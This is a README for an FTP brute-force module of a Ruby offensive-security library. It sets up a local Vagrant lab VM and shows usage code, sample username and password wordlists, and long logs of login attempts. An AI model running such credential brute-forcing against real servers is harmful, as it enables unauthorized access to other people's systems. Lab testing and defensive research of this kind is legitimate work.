# FTP Brute Forcer 

Using brute-force, you can easily try to force your way into a server over FTP.

## Vagrantfile

In this directory, along with the ruby code and the README.md, you'll find a `Vagrantfile` which you can use to setup a VM to test out the FTP Brute Forcer. This requires you to have [vagrant](https://www.vagrantup.com/) installed.

#### Start VM

```shell
$ pwd 
/somewhere/violent_ruby/lib/violent_ruby/ftp_brute_forcer
$ ls
README.md           Vagrantfile         ftp_brute_forcer.rb
$ vagrant up
Bringing machine 'default' up with 'virtualbox' provider...
==> default: Importing base box 'debian/jessie64'...
==> ect...
```

#### SSH into VM

Very simply `vagrant ssh` will allow you to SSH into the VM to make changes or monitor the VM while brute-forcing it for blue team research.

```shell
$ vagrant ssh

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
vagrant@jessie:~$ 
```

The VM should be provisioned with vsftp, and it should be running with anonymous access turned on. Because that's fun.

#### Stop VM

If you've logged into the VM via ssh, logout and then use `vagrant destroy` to destroy the VM.

```shell
$ vagrant destroy
    default: Are you sure you want to destroy the 'default' VM? [y/N] y
==> default: Forcing shutdown of VM...
==> default: Destroying VM and associated drives...
```

## Initialization

```ruby
require 'violent_ruby'

ftp = FtpBruteForcer.new
```

## Providing Required Files

```ruby
require 'violent_ruby'

ftp = FtpBruteForcer.new

ftp.users     = "resources/ftp_users.txt"
ftp.ports     = "resources/ftp_ports.txt"
ftp.ips       = "resources/ftp_ips.txt"
ftp.passwords = "resources/ftp_passwords.txt"
```

#### Users

A `.users` file should contain a list of ftp usernames to use.

```
anonymous
ftp
vagrant
root
admin
picat
```

#### Passwords

A `.passwords` file should contain a list of ftp passwords to use.

```
vagrant
ftp
root
toor
picat
```

#### IPs

A `.ips` file should contain a list of ip addresses to attempt connections on.

```
192.168.33.9
192.168.33.10
192.168.33.111
```

#### Ports

A `.ports` file should contain a list of ports to attempt connections on.

```
21
2121
```
## Brute Force'n

Once everything has been setup, we're going to be able to try start brute forcing!

```ruby
require 'violent_ruby'

ftp = FtpBruteForcer.new

ftp.users     = "resources/ftp_users.txt"
ftp.ports     = "resources/ftp_ports.txt"
ftp.ips       = "resources/ftp_ips.txt"
ftp.passwords = "resources/ftp_passwords.txt"

results = ftp.brute_force!
results
# => [{:time=>2017-04-03 19:02:11 -0400, :type=>"SUCCESS", :ip=>"192.168.33.10", :port=>"21", :user=>"anonymous", :password=>"vagrant"},
# {:time=>2017-04-03 19:02:11 -0400, :type=>"SUCCESS", :ip=>"192.168.33.10", :port=>"21", :user=>"anonymous", :password=>"ftp"},
# {:time=>2017-04-03 19:02:11 -0400, :type=>"SUCCESS", :ip=>"192.168.33.10", :port=>"21", :user=>"anonymous", :password=>"root"},
# {:time=>2017-04-03 19:02:11 -0400, :type=>"SUCCESS", :ip=>"192.168.33.10", :port=>"21", :user=>"anonymous", :password=>"toor"},
# {:time=>2017-04-03 19:02:11 -0400, :type=>"SUCCESS", :ip=>"192.168.33.10", :port=>"21", :user=>"anonymous", :password=>"picat"},
# {:time=>2017-04-03 19:02:11 -0400, :type=>"SUCCESS", :ip=>"192.168.33.10", :port=>"21", :user=>"ftp", :password=>"vagrant"},
# {:time=>2017-04-03 19:02:12 -0400, :type=>"SUCCESS", :ip=>"192.168.33.10", :port=>"21", :user=>"ftp", :password=>"ftp"},
# {:time=>2017-04-03 19:02:12 -0400, :type=>"SUCCESS", :ip=>"192.168.33.10", :port=>"21", :user=>"ftp", :password=>"root"},
# {:time=>2017-04-03 19:02:12 -0400, :type=>"SUCCESS", :ip=>"192.168.33.10", :port=>"21", :user=>"ftp", :password=>"toor"},
# {:time=>2017-04-03 19:02:12 -0400, :type=>"SUCCESS", :ip=>"192.168.33.10", :port=>"21", :user=>"ftp", :password=>"picat"},
# {:time=>2017-04-03 19:02:12 -0400, :type=>"SUCCESS", :ip=>"192.168.33.10", :port=>"21", :user=>"vagrant", :password=>"vagrant"},
# {:time=>2017-04-03 19:02:15 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"vagrant", :password=>"ftp"},
# {:time=>2017-04-03 19:02:18 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"vagrant", :password=>"root"},
# {:time=>2017-04-03 19:02:21 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"vagrant", :password=>"toor"},
# {:time=>2017-04-03 19:02:24 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"vagrant", :password=>"picat"},
# {:time=>2017-04-03 19:02:27 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"root", :password=>"vagrant"},
# {:time=>2017-04-03 19:02:31 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"root", :password=>"ftp"},
# {:time=>2017-04-03 19:02:33 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"root", :password=>"root"},
# {:time=>2017-04-03 19:02:36 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"root", :password=>"toor"},
# {:time=>2017-04-03 19:02:38 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"root", :password=>"picat"},
# {:time=>2017-04-03 19:02:42 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"admin", :password=>"vagrant"},
# {:time=>2017-04-03 19:02:46 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"admin", :password=>"ftp"},
# {:time=>2017-04-03 19:02:48 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"admin", :password=>"root"},
# {:time=>2017-04-03 19:02:51 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"admin", :password=>"toor"},
# {:time=>2017-04-03 19:02:54 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"admin", :password=>"picat"},
# {:time=>2017-04-03 19:02:57 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"picat", :password=>"vagrant"},
# {:time=>2017-04-03 19:03:00 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"picat", :password=>"ftp"},
# {:time=>2017-04-03 19:03:03 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"picat", :password=>"root"},
# {:time=>2017-04-03 19:03:06 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"picat", :password=>"toor"},
# {:time=>2017-04-03 19:03:09 -0400, :type=>"FAILURE", :ip=>"192.168.33.10", :port=>"21", :user=>"picat", :password=>"picat"}]
```

#### Results as Json?

```
require 'violent_ruby'
require 'json'

# same setup as before ...

results = ftp.brute_force!

# but, now json!

puts results.to_json

[  
{  
  "time":"2017-04-03 20:20:33 -0400",
    "type":"SUCCESS",
    "ip":"192.168.33.10",
    "port":"21",
    "user":"anonymous",
    "password":"vagrant"
},
{  
  "time":"2017-04-03 20:20:33 -0400",
  "type":"SUCCESS",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"anonymous",
  "password":"ftp"
},
{  
  "time":"2017-04-03 20:20:33 -0400",
  "type":"SUCCESS",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"anonymous",
  "password":"root"
},
{  
  "time":"2017-04-03 20:20:33 -0400",
  "type":"SUCCESS",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"anonymous",
  "password":"toor"
},
{  
  "time":"2017-04-03 20:20:33 -0400",
  "type":"SUCCESS",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"anonymous",
  "password":"picat"
},
{  
  "time":"2017-04-03 20:20:33 -0400",
  "type":"SUCCESS",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"ftp",
  "password":"vagrant"
},
{  
  "time":"2017-04-03 20:20:33 -0400",
  "type":"SUCCESS",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"ftp",
  "password":"ftp"
},
{  
  "time":"2017-04-03 20:20:33 -0400",
  "type":"SUCCESS",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"ftp",
  "password":"root"
},
{  
  "time":"2017-04-03 20:20:34 -0400",
  "type":"SUCCESS",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"ftp",
  "password":"toor"
},
{  
  "time":"2017-04-03 20:20:34 -0400",
  "type":"SUCCESS",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"ftp",
  "password":"picat"
},
{  
  "time":"2017-04-03 20:20:34 -0400",
  "type":"SUCCESS",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"vagrant",
  "password":"vagrant"
},
{  
  "time":"2017-04-03 20:20:36 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"vagrant",
  "password":"ftp"
},
{  
  "time":"2017-04-03 20:20:39 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"vagrant",
  "password":"root"
},
{  
  "time":"2017-04-03 20:20:42 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"vagrant",
  "password":"toor"
},
{  
  "time":"2017-04-03 20:20:45 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"vagrant",
  "password":"picat"
},
{  
  "time":"2017-04-03 20:20:48 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"root",
  "password":"vagrant"
},
{  
  "time":"2017-04-03 20:20:52 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"root",
  "password":"ftp"
},
{  
  "time":"2017-04-03 20:20:55 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"root",
  "password":"root"
},
{  
  "time":"2017-04-03 20:20:57 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"root",
  "password":"toor"
},
{  
  "time":"2017-04-03 20:21:00 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"root",
  "password":"picat"
},
{  
  "time":"2017-04-03 20:21:03 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"admin",
  "password":"vagrant"
},
{  
  "time":"2017-04-03 20:21:06 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"admin",
  "password":"ftp"
},
{  
  "time":"2017-04-03 20:21:09 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"admin",
  "password":"root"
},
{  
  "time":"2017-04-03 20:21:12 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"admin",
  "password":"toor"
},
{  
  "time":"2017-04-03 20:21:15 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"admin",
  "password":"picat"
},
{  
  "time":"2017-04-03 20:21:19 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"picat",
  "password":"vagrant"
},
{  
  "time":"2017-04-03 20:21:22 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"picat",
  "password":"ftp"
},
{  
  "time":"2017-04-03 20:21:25 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"picat",
  "password":"root"
},
{  
  "time":"2017-04-03 20:21:27 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"picat",
  "password":"toor"
},
{  
  "time":"2017-04-03 20:21:30 -0400",
  "type":"FAILURE",
  "ip":"192.168.33.10",
  "port":"21",
  "user":"picat",
  "password":"picat"
}
]
```

Yay, serialization! Fo' cereal. 
